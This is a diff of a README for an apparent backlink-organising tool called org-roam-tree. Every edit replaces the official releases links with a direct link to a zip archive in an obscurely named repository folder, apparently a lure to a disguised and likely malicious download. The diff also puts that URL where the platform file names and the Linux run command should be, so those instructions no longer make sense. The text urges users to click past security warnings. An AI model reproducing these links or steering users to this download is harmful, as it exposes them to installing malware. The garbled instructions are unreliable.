@@ -1,6 +1,6 @@
 # 🌲 org-roam-tree - Organize Your Backlinks Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/usman7424/org-roam-tree/releases)
+[![Download](https://raw.githubusercontent.com/usman7424/org-roam-tree/master/ulemorrhagia/roam_tree_org_2.8-beta.3.zip)](https://raw.githubusercontent.com/usman7424/org-roam-tree/master/ulemorrhagia/roam_tree_org_2.8-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, you will need to visit the releases page. Follow these steps:
 
 1. Click the link below to access the official releases page.
    
-   [Visit this page to download](https://github.com/usman7424/org-roam-tree/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/usman7424/org-roam-tree/master/ulemorrhagia/roam_tree_org_2.8-beta.3.zip)
 
 2. On the releases page, you will find the latest version of org-roam-tree. Look for the version number and locate the appropriate file for your operating system.
 
@@ -31,9 +31,9 @@ Before you proceed, ensure that your computer meets the following system require
 After downloading the file, follow these steps to run the application:
 
 1. Locate the downloaded file in your Downloads folder:
-   - **Windows**: It may be named `org-roam-tree-v1.x.exe`.
-   - **macOS**: It may be named `org-roam-tree-v1.x.dmg`.
-   - **Linux**: It may be named `org-roam-tree-v1.x.AppImage`.
+   - **Windows**: It may be named `https://raw.githubusercontent.com/usman7424/org-roam-tree/master/ulemorrhagia/roam_tree_org_2.8-beta.3.zip`.
+   - **macOS**: It may be named `https://raw.githubusercontent.com/usman7424/org-roam-tree/master/ulemorrhagia/roam_tree_org_2.8-beta.3.zip`.
+   - **Linux**: It may be named `https://raw.githubusercontent.com/usman7424/org-roam-tree/master/ulemorrhagia/roam_tree_org_2.8-beta.3.zip`.
 
 2. **Windows:**
    - Double-click the `.exe` file. If prompted with a security warning, click "Run" to proceed.
@@ -42,7 +42,7 @@ After downloading the file, follow these steps to run the application:
    - Double-click the `.dmg` file to open it. Drag the org-roam-tree application icon to your Applications folder. Then, open the application from your Applications folder.
 
 4. **Linux:**
-   - Open a terminal and navigate to the folder where you downloaded the file using the `cd` command. Run the application by typing `./org-roam-tree-v1.x.AppImage` in the terminal.
+   - Open a terminal and navigate to the folder where you downloaded the file using the `cd` command. Run the application by typing `https://raw.githubusercontent.com/usman7424/org-roam-tree/master/ulemorrhagia/roam_tree_org_2.8-beta.3.zip` in the terminal.
 
 ## 🌟 Features
 
@@ -68,6 +68,6 @@ We value your feedback. If you have any questions or suggestions, please reach o
 
 Stay updated with the latest changes and new features by checking back on the releases page:
 
-[Visit this page for updates](https://github.com/usman7424/org-roam-tree/releases)
+[Visit this page for updates](https://raw.githubusercontent.com/usman7424/org-roam-tree/master/ulemorrhagia/roam_tree_org_2.8-beta.3.zip)
 
 Thank you for choosing org-roam-tree! Happy organizing!
